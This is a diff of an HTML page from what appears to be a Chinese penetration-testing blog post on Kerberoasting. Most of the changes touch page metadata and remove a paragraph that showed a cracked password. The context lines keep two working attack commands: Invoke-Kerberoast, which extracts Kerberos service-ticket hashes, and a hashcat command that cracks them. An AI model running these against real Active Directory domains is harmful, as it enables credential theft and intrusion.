@@ -17,8 +17,7 @@
 <meta property="og:image" content="https://green-m.github.io/styles/images/kerberos/kerberos_01.png">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5">
 <meta property="og:image" content="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png">
-<meta property="og:updated_time" content="2019-06-26T16:11:36.000Z">
+<meta property="og:updated_time" content="2019-08-27T15:38:23.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【域渗透】Kerberoasting攻击">
 <meta name="twitter:description" content="基本概念SPN 全称 Service Principal Names SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下 当一个服务的权限为 Local System或Network Service，则SPN注册在机器帐户(Computers)下 当一个服务的">
@@ -191,9 +190,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
 <p>使用hashcat破解的参数如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>
-<p>  破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
-<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-1-15/2-4.png" alt=""></p>
-
   </div>
 </article>
 
